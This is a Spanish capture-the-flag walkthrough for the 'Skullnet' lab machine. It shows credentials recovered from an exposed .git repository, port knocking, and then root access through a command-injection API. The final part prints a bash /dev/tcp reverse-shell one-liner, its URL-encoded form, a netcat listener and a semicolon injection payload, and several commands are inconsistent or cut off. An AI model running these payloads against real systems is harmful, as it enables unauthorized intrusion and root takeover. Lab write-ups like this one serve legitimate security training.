Maquina: Skullnet

Autor: The Hacker Labs

Dificultad: Dificil

![Screenshot 2024-11-16 095739](https://github.com/user-attachments/assets/5b69c447-8f76-4777-89e0-f4dcc3380249)

ping 172.18.0.2 -c 1

![Screenshot 2024-11-16 103630](https://github.com/user-attachments/assets/98973b45-693a-4426-8722-d09e20842a5a)

Realizamos un escaneo de los puertos

nmap -sC -sV -Pn 172.18.0.2 -oG escaneo

![Screenshot 2024-11-16 103847](https://github.com/user-attachments/assets/7c3f10fb-1286-4be3-a496-72c98e456203)

Realizamos un escaneo mas detallado y encontramos un directorio .git

nmap -sC -sV -Pn --open 172.18.0.2

usamos githack

githack http://skullnet.es/.git/

vamos a la carpeta que se genera

git log

descubrimos 2 hashes

Revisamos cada commit, en el primero observamos que tenemos un mensaje

git show 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9

En el segundo commit tenemos lo siguiente

git show 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d

Observamos que identificamos varios archivos
Primero un archivo authentication.txt que fue eliminado 
Para recuperar el archivo eliminado hacemos lo siguiente

git checkout 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9^ --authentication

git add authentication.txt

Listamos los archivos y podemos observar que es el mismo texto que nos dio.

catnp authentication.txt

Obtenemos unas credenciales

skulloperator:+%7nj^g!DQxp]a>c4v&0

Seguimos revisando y ahora debemos buscar el archivo /network.pcap

git checkout 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9^ -- network.pcap

git add network.pcap

Abrimos el archivo con whireshark, como la consulta es corta podemos hacerlo manual. 
Comprobando la captura podemos observar que en la IP de nuestro interés se tiene comunicación con el puerto SSH y 3 puertos adicionales

Con esta información realizaremos un port knocking a los puertos encontrados

knock 172.17.0.2 1000 12000 5000 -v

ejecutar nmap

nmap -sC -sV -Pn 172.18.0.2

Ya que tenemos habilitado el puerto SSH 

Accedemos por ssh con las credenciales obtenidas

ssh skulloperator@172.18.0.2

ls

cat user.txt

Revisando procesos observamos que tenemos el archivo skullnet_api.py que lo está ejecutando root

ps aux

Abrimos el archivo y podemos observar el siguiente escucha en el puerto 8081 y ejecuta comandos cuando recibe una solicitud http get con un parámetro específico

Este código para la parte de autenticación espera un encabezado Authorization con el esquema de basic como tenemos la clave de autenticación AUTH_KEY_BASE64 y si esa sección convertimos de base 64 podemos observar lo siguiente.

echo "d2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA==" | base64 -d

Con esto en conocimiento la estructura del encabezado de Authorization sería la siguiente.

Authorization: basic we_are_bones_513546516486484

usamos curl con el parametro exec

Ejecutamos el comando y podemos observar que listamos archivos y también podemos observar que los ejecutamos como root

curl http://localhost:8081/?exec-ls -H 'Authorization: Basic we_are_bones_513546516486484'
close.sh
open.sh
root.txt

curl http://localhost:8081/?exec-whoami -H 'Authorization: Basic we_are_bones_513546516486484'

Con esto en mente podemos establecer una revshell

bash -c 'bash -i >& /dev/tcp/172.18.0.2/1234 0>&1'

La URL encodeamos para evitar problemas

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1234%200%3E%261%22

iniciamos netcat

nc -lvnp 1234

URL en codeado sería %3B, Con este permiso lo que hacemos es agregar el comando luego del ls

curl http://localhost:8081/?exec=ls%3Bbash%20-c%20%22bash%20-i%

Si vamos a nuestro listener podemos observar que ya tenemos acceso a la consola de root
